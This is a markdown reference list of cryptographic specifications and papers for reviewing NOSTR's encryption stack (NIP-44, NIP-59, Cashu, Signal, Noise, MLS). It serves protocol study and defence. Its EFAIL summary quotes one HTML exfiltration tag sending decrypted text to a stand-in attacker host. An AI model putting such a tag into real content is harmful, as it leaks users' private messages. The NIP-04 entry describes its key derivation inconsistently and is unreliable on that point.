# Cryptographic References

Key papers, specifications, and resources for cryptographic protocol review, with emphasis on NOSTR's encryption stack and messaging protocol design.

---

## 1. NOSTR Protocol Specifications

### NIP-44: Encrypted Payloads (Versioned)
- **Specification:** https://github.com/nostr-protocol/nips/blob/master/44.md
- **Status:** Active (version 0x02)
- **Algorithm summary:** secp256k1 ECDH -> HKDF-Extract (salt="nip44-v2") -> HKDF-Expand (info=random_nonce, L=76) -> ChaCha20 encryption -> HMAC-SHA256 authentication (Encrypt-then-MAC)
- **Key parameters:**
  - Conversation key: 32 bytes (HKDF-Extract output)
  - Nonce: 32 bytes (random, transmitted in payload)
  - ChaCha20 key: 32 bytes (from HKDF-Expand)
  - ChaCha20 nonce: 12 bytes (from HKDF-Expand, IETF variant)
  - HMAC key: 32 bytes (from HKDF-Expand)
  - MAC: 32 bytes (HMAC-SHA256 output)
  - Padding: power-of-2 scheme with 2-byte length prefix
- **Payload format:** `version(1) || nonce(32) || ciphertext(variable) || mac(32)`, base64-encoded
- **Security audit:** Cure53, December 2023
- **Test vectors:** SHA256 checksum `269ed0f69e4c192512cc779e78c555090cebc7c785b609e338a62afc3ce25040`
- **Key implementations:**
  - JavaScript: `nostr-tools` `nip44.ts`
  - Rust: `rust-nostr` `nostr` crate, `nips/nip44.rs`
  - Go: `go-nostr` `nip44/nip44.go`
  - Python: `rust-nostr` FFI bindings

### NIP-59: Gift Wrap
- **Specification:** https://github.com/nostr-protocol/nips/blob/master/59.md
- **Status:** Active
- **Event kinds:** 13 (Seal), 1059 (Gift Wrap)
- **Three-layer structure:**
  - Layer 1 (Rumor): Unsigned event, actual content, provides deniability
  - Layer 2 (Seal, kind 13): NIP-44 encrypted Rumor, signed by sender's real key, empty tags, randomized timestamp
  - Layer 3 (Gift Wrap, kind 1059): NIP-44 encrypted Seal, signed by ephemeral key, `p` tag for routing, randomized timestamp (+/- 2 days)
- **Multi-recipient:** Separate Gift Wrap per recipient, each with unique ephemeral key
- **Key implementations:**
  - JavaScript: `nostr-tools` `nip59.ts`
  - Rust: `rust-nostr` `nostr` crate, `nips/nip59.rs`
  - Go: `go-nostr` `nip59/nip59.go`

### NIP-04: Encrypted Direct Message (Deprecated)
- **Specification:** https://github.com/nostr-protocol/nips/blob/master/04.md
- **Status:** Deprecated in favor of NIP-17 (which uses NIP-44 + NIP-59)
- **Algorithm:** AES-256-CBC with raw ECDH shared secret as key, random 16-byte IV, no MAC
- **Known vulnerabilities:** No authentication (bit-flipping attacks), non-standard ECDH (used SHA256 of shared point instead of X coordinate), full metadata leakage (sender/recipient in event tags), no padding (length leakage)
- **Historical significance:** First encryption in NOSTR; illustrates nearly every anti-pattern fixed by NIP-44

### NIP-17: Private Direct Messages
- **Specification:** https://github.com/nostr-protocol/nips/blob/master/17.md
- **Status:** Active
- **Uses:** NIP-44 for encryption, NIP-59 for wrapping
- **Event kind:** 14 (inside the Rumor)

---

## 2. Elliptic Curve and Signature Specifications

### BIP-340: Schnorr Signatures for secp256k1
- **Specification:** https://github.com/bitcoin/bips/blob/master/bip-0340.mediawiki
- **Authors:** Pieter Wuille, Jonas Nick, Tim Ruffing
- **Key features:**
  - X-only 32-byte public keys (implicit even Y coordinate)
  - 64-byte signatures (R.x || s)
  - Tagged hashing for domain separation: SHA256(SHA256(tag) || SHA256(tag) || msg)
  - Deterministic-with-auxiliary-randomness nonce generation
  - Batch verification support
- **Security:** EUF-CMA in the random oracle model under the DL assumption on secp256k1
- **Used in NOSTR:** All event signatures (NIP-01), Seal signatures (NIP-59), Cashu token spending (NUT-11)

### SEC 2: Recommended Elliptic Curve Domain Parameters
- **Specification:** https://www.secg.org/sec2-v2.pdf
- **Relevant section:** Section 2.4.1 (secp256k1 parameters)
- **Curve:** y^2 = x^3 + 7 over GF(p), p = 2^256 - 2^32 - 977
- **Order:** n = FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
- **Cofactor:** h = 1
- **Security level:** ~128 bits

### BIP-32: Hierarchical Deterministic Wallets
- **Specification:** https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki
- **Relevance:** Key derivation paths for NOSTR key management; Cashu NUT-13 uses BIP-32-style deterministic secret derivation from seed phrases

---

## 3. Cashu NUT Specifications (Blind Signatures and Ecash)

### Primary Repository
- **Repository:** https://github.com/cashubtc/nuts
- **Protocol:** Chaumian ecash using Blind Diffie-Hellman Key Exchange (BDHKE) over secp256k1

### Individual NUT Specifications

| NUT | Title | Relevance |
|-----|-------|-----------|
| NUT-00 | Notation, Terminology, and Token Format | Base token structure, hash_to_curve (secp256k1), BDHKE algorithm |
| NUT-01 | Mint Public Key Distribution | Mint keyset discovery |
| NUT-02 | Keysets and Key Rotation | Denomination-specific keys, rotation schedule |
| NUT-03 | Swap (Split and Merge) | Token atomization and combination |
| NUT-04 | Minting Tokens | Lightning invoice -> ecash flow |
| NUT-05 | Melting Tokens | Ecash -> Lightning payment flow |
| NUT-06 | Mint Information | Mint capability discovery endpoint |
| NUT-07 | Token State Check | Spent/unspent verification |
| NUT-08 | Lightning Fee Return | Overpayment handling via blank outputs |
| NUT-09 | Restore | Backup recovery via blinded signature replay |
| NUT-10 | Spending Conditions | P2PK and hash lock predicates |
| NUT-11 | Pay-to-Public-Key | Schnorr signature authorization for spending |
| NUT-12 | DLEQ Proofs | Discrete Log Equality proofs for mint transparency (Chaum-Pedersen protocol) |
| NUT-13 | Deterministic Secrets | BIP-32-style deterministic secret and blinding factor derivation from seed |

### Key Cryptographic Operations in Cashu
- **hash_to_curve:** Maps a byte string to a secp256k1 point. Uses SHA-256 hash with try-and-increment: hash the input, interpret as X coordinate, check if valid point exists, increment counter if not.
- **BDHKE blinding:** B' = Y + r*G (user computes blinded message)
- **BDHKE signing:** C' = k*B' (mint signs blinded message)
- **BDHKE unblinding:** C = C' - r*K (user recovers unblinded signature)
- **DLEQ proof:** Proves log_G(K) = log_B'(C') without revealing k (Chaum-Pedersen protocol)

---

## 4. Symmetric Cryptography Standards

### RFC 8439: ChaCha20 and Poly1305 for IETF Protocols
- **Authors:** Y. Nir, A. Langley
- **Date:** June 2018
- **URL:** https://www.rfc-editor.org/rfc/rfc8439
- **Key content:**
  - ChaCha20 algorithm (Section 2.3): 256-bit key, 96-bit nonce, 32-bit counter
  - Poly1305 MAC (Section 2.5): one-time MAC, 256-bit key, 128-bit tag
  - AEAD_CHACHA20_POLY1305 construction (Section 2.8)
  - Test vectors (Section 2.3.2, 2.4.2, 2.5.2, 2.8.2)
- **Note:** NIP-44 uses ChaCha20 from this RFC but replaces Poly1305 with HMAC-SHA256

### Original ChaCha Paper
- **Title:** "ChaCha, a variant of Salsa20"
- **Author:** Daniel J. Bernstein
- **Date:** 2008
- **URL:** https://cr.yp.to/chacha/chacha-20080128.pdf
- **Key content:** Definition of the ChaCha quarter-round, comparison with Salsa20, security analysis

### RFC 2104: HMAC -- Keyed-Hashing for Message Authentication
- **Authors:** H. Krawczyk, M. Bellare, R. Canetti
- **Date:** February 1997
- **URL:** https://www.rfc-editor.org/rfc/rfc2104
- **Key content:** HMAC construction: H((K XOR opad) || H((K XOR ipad) || text))
- **Security proof:** HMAC is a PRF if the compression function of H is a PRF (weaker than collision resistance)

### RFC 5869: HMAC-based Extract-and-Expand Key Derivation Function (HKDF)
- **Author:** H. Krawczyk, P. Eronen
- **Date:** May 2010
- **URL:** https://www.rfc-editor.org/rfc/rfc5869
- **Key content:**
  - HKDF-Extract: PRK = HMAC-Hash(salt, IKM)
  - HKDF-Expand: OKM = T(1) || T(2) || ... where T(i) = HMAC-Hash(PRK, T(i-1) || info || i)
  - Maximum output: 255 * HashLen bytes
- **Underlying paper:** H. Krawczyk, "Cryptographic Extraction and Key Derivation: The HKDF Scheme," IACR Cryptology ePrint Archive, 2010/264

### RFC 6234: US Secure Hash Algorithms (SHA and SHA-based HMAC and HKDF)
- **URL:** https://www.rfc-editor.org/rfc/rfc6234
- **Key content:** SHA-256 specification (256-bit output, 512-bit block, 64 rounds)

---

## 5. Signal Protocol Papers

### X3DH (Extended Triple Diffie-Hellman)
- **Title:** "The X3DH Key Agreement Protocol"
- **Authors:** Moxie Marlinspike, Trevor Perrin
- **Date:** November 2016 (revised 2017)
- **URL:** https://signal.org/docs/specifications/x3dh/
- **Key content:** Three (or four) DH computations for mutual authentication and forward secrecy in asynchronous settings. Uses identity keys, signed pre-keys, and one-time pre-keys.

### Double Ratchet Algorithm
- **Title:** "The Double Ratchet Algorithm"
- **Authors:** Trevor Perrin, Moxie Marlinspike
- **Date:** November 2016 (revised 2018)
- **URL:** https://signal.org/docs/specifications/doubleratchet/
- **Key content:** Symmetric ratchet (KDF chain) combined with DH ratchet. Provides per-message forward secrecy and post-compromise security.

### Formal Analysis of Signal
- **Title:** "A Formal Security Analysis of the Signal Messaging Protocol"
- **Authors:** Katriel Cohn-Gordon, Cas Cremers, Benjamin Dowling, Luke Garratt, Douglas Stebila
- **Venue:** IEEE European Symposium on Security and Privacy (EuroS&P), 2017
- **URL:** https://eprint.iacr.org/2016/1013
- **Key findings:** Proved X3DH + Double Ratchet achieves a strong multi-stage key exchange security notion. Identified subtle interactions between the protocol stages.

- **Title:** "On Post-Compromise Security"
- **Authors:** Katriel Cohn-Gordon, Cas Cremers, Luke Garratt
- **Venue:** IEEE CSF, 2016
- **URL:** https://eprint.iacr.org/2016/221
- **Key findings:** Formal definition of post-compromise security (PCS). Showed that the Double Ratchet achieves PCS after one round-trip.

---

## 6. The Noise Protocol Framework

### Specification
- **Title:** "The Noise Protocol Framework"
- **Author:** Trevor Perrin
- **Date:** Revision 34, July 2018
- **URL:** https://noiseprotocol.org/noise.html
- **Key content:**
  - Handshake pattern notation (N, K, X, I for key knowledge)
  - CipherState and SymmetricState abstractions
  - DH functions (Curve25519, secp256k1), cipher functions (ChaCha20-Poly1305, AES-GCM), hash functions (SHA-256, BLAKE2)
  - Security properties per pattern (confidentiality levels 0-5, authentication levels 0-2)
  - PSK (pre-shared key) modifiers

### Formal Analysis of Noise
- **Title:** "A Formal Analysis of the Noise Protocol Framework"
- **Authors:** Benjamin Dowling, Paul Rösler, Jörg Schwenk
- **Venue:** IACR ePrint, 2020
- **Key findings:** Mechanized analysis of all Noise handshake patterns. Confirmed security properties claimed in the specification for most patterns.

### Relevance to NOSTR
- NIP-44's encryption resembles a one-shot Noise K pattern (both parties know each other's static keys).
- NIP-59's Gift Wrap layer resembles a Noise N pattern (initiator is anonymous, responder's key is known).
- Noise's formal framework can be used to reason about the security of NIP-44/NIP-59 compositions.

---

## 7. Authenticated Encryption Theory

### "Authenticated Encryption: Relations among Notions and Analysis of the Generic Composition Paradigm"
- **Authors:** Mihir Bellare, Chanathip Namprempre
- **Venue:** ASIACRYPT 2000
- **URL:** https://eprint.iacr.org/2000/025
- **Key findings:**
  - Encrypt-then-MAC (EtM) achieves IND-CCA2 from IND-CPA encryption + UF-CMA MAC (with independent keys).
  - MAC-then-Encrypt (MtE) does NOT generically achieve IND-CCA2.
  - Encrypt-and-MAC (E&M) does NOT generically achieve IND-CPA.
- **Direct relevance:** NIP-44 uses EtM composition; this paper provides the security proof foundation.

### "The Order of Encryption and Authentication for Protecting Communications"
- **Author:** Hugo Krawczyk
- **Venue:** CRYPTO 2001
- **URL:** https://eprint.iacr.org/2001/045
- **Key findings:** Strengthened the Bellare-Namprempre results. Showed that EtM with a strongly unforgeable MAC provides the strongest security. Showed specific attacks on MtE with stream ciphers.

### "Encrypt-then-MAC for Key-Dependent Messages"
- **Authors:** Florian Böhl, Dennis Hofheinz, Daniel Kraschewski
- **Key findings:** Extended EtM security analysis to the key-dependent message (KDM) setting.

---

## 8. TLS 1.3 Formal Analysis

### "Automated Analysis and Verification of TLS 1.3: 0-RTT, Resumption, and Delayed Authentication"
- **Authors:** Cas Cremers, Marko Horvat, Jonathan Hoyland, Sam Scott, Thyla van der Merwe
- **Venue:** IEEE S&P, 2016
- **URL:** https://tls13tamarin.github.io/TLS13Tamarin/
- **Key findings:** Tamarin-based formal analysis of TLS 1.3 draft. Found issues with 0-RTT replay protection. Confirmed security of the main handshake.

### "Implementing and Proving the TLS 1.3 Record Layer"
- **Authors:** Karthikeyan Bhargavan, Antoine Delignat-Lavaud, Cedric Fournet, Markulf Kohlweiss, Jianyang Pan, Jonathan Protzenko, Aseem Rastogi, Nikhil Swamy, Santiago Zanella-Beguelin, Jean Karim Zinzindohoue
- **Venue:** IEEE S&P, 2017
- **Key findings:** Verified implementation of TLS 1.3 record layer in F*. Proved IND-CCA2 security of the AEAD-based record protocol.

### Relevance to NOSTR
- TLS 1.3 uses HKDF for key derivation (same primitive as NIP-44).
- TLS 1.3 formal analyses demonstrate techniques applicable to NOSTR protocol verification.
- The 0-RTT replay issue in TLS 1.3 is analogous to replay concerns in NOSTR's one-shot encryption model.

---

## 9. MLS (Messaging Layer Security)

### RFC 9420: The Messaging Layer Security (MLS) Protocol
- **URL:** https://www.rfc-editor.org/rfc/rfc9420
- **Date:** July 2023
- **Key content:**
  - TreeKEM: tree-based group key agreement with O(log n) cost for member updates
  - Epoch-based key schedule with forward secrecy and post-compromise security
  - Proposals and Commits for group membership changes
  - Content encryption using AEAD with sender-specific keys
  - Welcome messages for new member onboarding
- **Cipher suites:** MLS_128_DHKEMX25519_AES128GCM_SHA256_Ed25519, MLS_128_DHKEMP256_AES128GCM_SHA256_P256, MLS_128_DHKEMX25519_CHACHA20POLY1305_SHA256_Ed25519, and others

### "On Ends-to-Ends Encryption: Asynchronous Group Messaging with Strong Security Guarantees"
- **Authors:** Katriel Cohn-Gordon, Cas Cremers, Luke Garratt, Jon Millican, Kevin Milner
- **Venue:** ACM CCS, 2018
- **URL:** https://eprint.iacr.org/2017/666
- **Key findings:** Formal security model for asynchronous group messaging. Defined security properties (confidentiality, authentication, FS, PCS) and analyzed ART (Asynchronous Ratcheting Trees), a predecessor to MLS TreeKEM.

### Relevance to NOSTR
- NIP-EE proposes MLS-based group messaging for NOSTR.
- MLS's design decisions (particularly around asynchronous delivery and group state) are directly relevant to any group encryption scheme on NOSTR.
- TreeKEM's approach to key rotation could inform future NOSTR key management designs.

---

## 10. Attack Papers

### EFAIL: Breaking S/MIME and OpenPGP Email Encryption using Exfiltration Channels
- **Authors:** Damian Poddebniak, Christian Dresen, Jens Muller, Fabian Ising, Sebastian Schinzel, Simon Friedberger, Juraj Somorovsky, Jorg Schwenk
- **Venue:** USENIX Security, 2018
- **URL:** https://efail.de/efail-attack-paper.pdf
- **Key findings:**
  - **Direct exfiltration:** Injecting HTML into multipart encrypted emails to create exfiltration channels (e.g., `<img src="http://attacker.com/?secret=DECRYPTED_TEXT">`).
  - **CBC/CFB gadget attacks:** Modifying unauthenticated ciphertext to inject chosen plaintext (e.g., HTML tags) around the target plaintext block.
  - **Root cause:** Lack of authenticated encryption in PGP's CFB mode and S/MIME's CBC mode.
- **Relevance to NOSTR Mail:** NIP-44's Encrypt-then-MAC prevents ciphertext modification. However, if a NOSTR Mail protocol renders active content (HTML, images), the direct exfiltration variant remains a concern if any layer fails to authenticate properly.

### KNOB Attack: Key Negotiation of Bluetooth
- **Title:** "The KNOB is Broken: Exploiting Low Entropy in the Encryption Key Negotiation of Bluetooth BR/EDR"
- **Authors:** Daniele Antonioli, Nils Ole Tippenhauer, Kasper Rasmussen
- **Venue:** USENIX Security, 2019
- **URL:** https://knobattack.com/
- **Key findings:**
  - Bluetooth BR/EDR allows negotiation of encryption key entropy down to 1 byte (8 bits).
  - A MITM attacker can force both parties to agree on a low-entropy key, then brute-force it.
  - Root cause: no minimum entropy requirement in the key negotiation protocol.
- **Relevance to NOSTR:** NIP-44 does not negotiate key parameters (fixed at 256-bit), but any versioned protocol with downgrade capability must enforce minimum security levels. If NIP-44 version 3 is ever introduced, clients must not accept downgrade to a weaker version.

### Padding Oracle Attacks
- **Title:** "Security Flaws Induced by CBC Padding -- Applications to SSL, IPSEC, WTLS..."
- **Author:** Serge Vaudenay
- **Venue:** EUROCRYPT 2002
- **Key findings:** If a decryptor reveals whether padding is valid (via error messages or timing), an attacker can decrypt arbitrary ciphertexts block-by-block with O(256 * block_size) queries per block.
- **Subsequent attacks:** POODLE (2014, SSLv3), Lucky Thirteen (2013, TLS CBC), BEAST (2011, TLS 1.0 CBC IV prediction).
- **Relevance to NIP-44:** NIP-44's Encrypt-then-MAC ordering means HMAC verification occurs before any padding processing, eliminating padding oracles entirely. This is the correct mitigation.

### Bleichenbacher's Attack on PKCS#1 v1.5 RSA
- **Title:** "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1"
- **Author:** Daniel Bleichenbacher
- **Venue:** CRYPTO 1998
- **Key findings:** RSA PKCS#1 v1.5 encryption creates an oracle when the server reveals whether decrypted padding is valid. Enables recovery of the RSA-encrypted session key.
- **Subsequent attacks:** ROBOT (2018), DROWN (2016).
- **Relevance:** Illustrates the general danger of exposing decryption failure modes. NIP-44 implementations must not distinguish between MAC failure, padding failure, and content parsing failure in their error responses.

### Key Compromise Impersonation in Static DH
- **Title:** "Unknown Key-Share Attacks on the Station-to-Station (STS) Protocol"
- **Authors:** Simon Blake-Wilson, Alfred Menezes
- **Venue:** PKC 1999
- **Key findings:** Demonstrated UKS and KCI attacks on static DH-based key agreement protocols. If one party's long-term key is compromised, the attacker can impersonate any other party to the compromised party.
- **Relevance:** NIP-44's static-static ECDH is inherently susceptible to KCI. A NOSTR Mail protocol should document this limitation and consider whether X3DH-style key agreement is warranted for high-security use cases.

### Reflections on Trusting Trust
- **Title:** "Reflections on Trusting Trust"
- **Author:** Ken Thompson
- **Venue:** ACM Turing Award Lecture, 1984
- **Relevance:** Foundational work on supply-chain trust. Relevant to NOSTR's trust model: clients must trust their cryptographic libraries, and there is no central authority to verify implementations.

---

## 11. Formal Verification Tools and Methodologies

### ProVerif
- **URL:** https://bblanche.gitlabpages.inria.fr/proverif/
- **Description:** Automated cryptographic protocol verifier based on the applied pi-calculus. Models protocols symbolically (Dolev-Yao model). Can verify secrecy, authentication, and equivalence properties.
- **Relevant analyses:** Used for TLS 1.3 analysis, Signal protocol analysis.

### Tamarin Prover
- **URL:** https://tamarin-prover.github.io/
- **Description:** Symbolic protocol verification tool supporting equational theories and temporal logic. More expressive than ProVerif for stateful protocols.
- **Relevant analyses:** TLS 1.3 (Cremers et al.), 5G AKA, Noise framework.

### CryptoVerif
- **URL:** https://bblanche.gitlabpages.inria.fr/CryptoVerif/
- **Description:** Computational model verifier (as opposed to symbolic). Produces game-based security proofs. More precise than Dolev-Yao tools but harder to use.

### Application to NOSTR
No formal verification of NIP-44 or NIP-59 has been published (as of early 2026). The Cure53 audit of NIP-44 (December 2023) was a code/design audit, not a formal proof. A formal analysis using Tamarin or ProVerif would strengthen confidence in the protocol's composition security.

---

## 12. Additional Foundational References

### Diffie-Hellman Key Exchange
- **Title:** "New Directions in Cryptography"
- **Authors:** Whitfield Diffie, Martin Hellman
- **Venue:** IEEE Transactions on Information Theory, 1976
- **Key content:** Original description of public-key cryptography and Diffie-Hellman key exchange.

### Probabilistic Encryption
- **Title:** "Probabilistic Encryption"
- **Authors:** Shafi Goldwasser, Silvio Micali
- **Venue:** JCSS, 1984 (conference version: STOC 1982)
- **Key content:** Defined semantic security (IND-CPA). Foundational for all modern encryption security notions.

### Random Oracle Model
- **Title:** "Random Oracles are Practical: A Paradigm for Designing Efficient Protocols"
- **Authors:** Mihir Bellare, Phillip Rogaway
- **Venue:** ACM CCS, 1993
- **Key content:** Introduced the random oracle model for practical protocol analysis. BIP-340 Schnorr signatures are proven secure in this model.

### Chaumian Blind Signatures
- **Title:** "Blind Signatures for Untraceable Payments"
- **Author:** David Chaum
- **Venue:** CRYPTO 1982
- **Key content:** Original description of blind signatures for anonymous ecash. Foundation for Cashu's BDHKE scheme.

### Hash-Based Key Derivation
- **Title:** "Cryptographic Extraction and Key Derivation: The HKDF Scheme"
- **Author:** Hugo Krawczyk
- **Venue:** CRYPTO 2010
- **URL:** https://eprint.iacr.org/2010/264
- **Key content:** Formal analysis of HKDF. Proves security of extract-then-expand under the assumption that HMAC is a PRF. Justifies the design used in NIP-44, TLS 1.3, and Signal.

### Curve25519 and X25519
- **Title:** "Curve25519: New Diffie-Hellman Speed Records"
- **Author:** Daniel J. Bernstein
- **Venue:** PKC 2006
- **URL:** https://cr.yp.to/ecdh/curve25519-20060209.pdf
- **Relevance:** While NOSTR uses secp256k1 (inherited from Bitcoin), X25519 is the standard DH function in Noise, Signal, and TLS 1.3. Understanding both curves is necessary for protocol comparison and potential future migration discussions.

---

## 13. Implementation Resources

### libsodium
- **URL:** https://doc.libsodium.org/
- **Description:** High-quality, audited cryptographic library. Provides ChaCha20, HMAC-SHA256, X25519, Ed25519, and secure memory management (sodium_memzero, sodium_mlock).
- **Relevance:** Reference implementation quality target for NOSTR crypto libraries.

### @noble/curves and @noble/hashes (JavaScript)
- **URL:** https://github.com/paulmillr/noble-curves, https://github.com/paulmillr/noble-hashes
- **Description:** Audited, zero-dependency JavaScript implementations of secp256k1, Schnorr (BIP-340), HKDF, HMAC-SHA256, ChaCha20. Used by nostr-tools.
- **Audit:** Trail of Bits, 2022

### rust-nostr SDK
- **URL:** https://github.com/rust-nostr/nostr
- **Description:** Rust implementation of NOSTR protocol including NIP-44 and NIP-59. FFI bindings for Python, Kotlin, Swift, JavaScript, C#, Flutter.

### nostr-tools (JavaScript)
- **URL:** https://github.com/nbd-wtf/nostr-tools
- **Description:** Reference JavaScript library for NOSTR. Includes nip44.ts (encryption/decryption) and nip59.ts (gift wrap).

### go-nostr (Go)
- **URL:** https://github.com/nbd-wtf/go-nostr
- **Description:** Reference Go library for NOSTR. Includes nip44 and nip59 packages.

---

## 14. Quick Reference: Key Sizes and Parameters

| Parameter | Size | Source |
|---|---|---|
| secp256k1 private key | 32 bytes (256 bits) | SEC 2 |
| secp256k1 public key (compressed) | 33 bytes | SEC 2 |
| secp256k1 public key (X-only, BIP-340) | 32 bytes | BIP-340 |
| BIP-340 signature | 64 bytes | BIP-340 |
| ECDH shared secret (X coordinate) | 32 bytes | NIP-44 |
| NIP-44 conversation key | 32 bytes | HKDF-Extract output |
| NIP-44 message nonce | 32 bytes | Random |
| ChaCha20 key | 32 bytes (256 bits) | RFC 8439 |
| ChaCha20 nonce (IETF) | 12 bytes (96 bits) | RFC 8439 |
| HMAC-SHA256 key (NIP-44) | 32 bytes (256 bits) | HKDF-Expand |
| HMAC-SHA256 output | 32 bytes (256 bits) | RFC 2104 |
| SHA-256 output | 32 bytes (256 bits) | RFC 6234 |
| SHA-256 block size | 64 bytes (512 bits) | RFC 6234 |
| NIP-44 minimum padded size | 32 bytes | NIP-44 spec |
| NIP-44 length prefix | 2 bytes (big-endian uint16) | NIP-44 spec |
| NIP-44 version byte | 1 byte (0x02) | NIP-44 spec |
| NIP-44 payload overhead | 65 bytes (1 version + 32 nonce + 32 mac) | NIP-44 spec |
| Cashu DLEQ proof | ~128 bytes (2 points + 1 scalar) | NUT-12 |
| Poly1305 tag (for comparison) | 16 bytes (128 bits) | RFC 8439 |
| AES-GCM tag (for comparison) | 16 bytes (128 bits) | NIST SP 800-38D |
